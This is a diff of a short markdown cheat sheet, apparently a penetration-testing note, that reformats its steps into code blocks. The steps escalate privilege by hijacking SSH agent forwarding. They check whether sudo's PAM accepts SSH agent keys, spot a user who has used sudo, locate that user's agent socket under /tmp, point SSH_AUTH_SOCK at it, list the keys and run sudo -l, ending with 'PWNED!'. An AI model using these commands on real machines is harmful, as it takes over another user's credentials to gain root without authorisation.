@@ -1,6 +1,8 @@
 ## STEPS:
 
-### 1) Check if PAM for sudo has been configured to accept SSH keys: cat /etc/pam.d/sudo
+### 1) Check if PAM for sudo has been configured to accept SSH keys: 
+
+    cat /etc/pam.d/sudo
 
 #### auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys
 
@@ -10,14 +12,24 @@
 #### @include common-account
 #### @include common-session-noninteractive
 
-## 2) Check if the user that has signed in has used sudo: ps aux
+## 2) Check if the user that has signed in has used sudo: 
 
-## 3) Find an SSH agent socket file fot the shell process we can access: ls -la  /tmp/ssh-WHATEVER/agent.####
+    ps aux
 
-## 4) export SSH_AUTH_SOCK=/tmp/ssh-WHATEVER/agent.####
+## 3) Find an SSH agent socket file fot the shell process we can access: 
 
-## 5) ssh-add -l
+    ls -la  /tmp/ssh-WHATEVER/agent.####
 
-## 6) sudo -l
+## 4) 
+
+    export SSH_AUTH_SOCK=/tmp/ssh-WHATEVER/agent.####
+
+## 5) 
+
+    ssh-add -l
+
+## 6) 
+
+    sudo -l
 
 ## 7) PWNED!
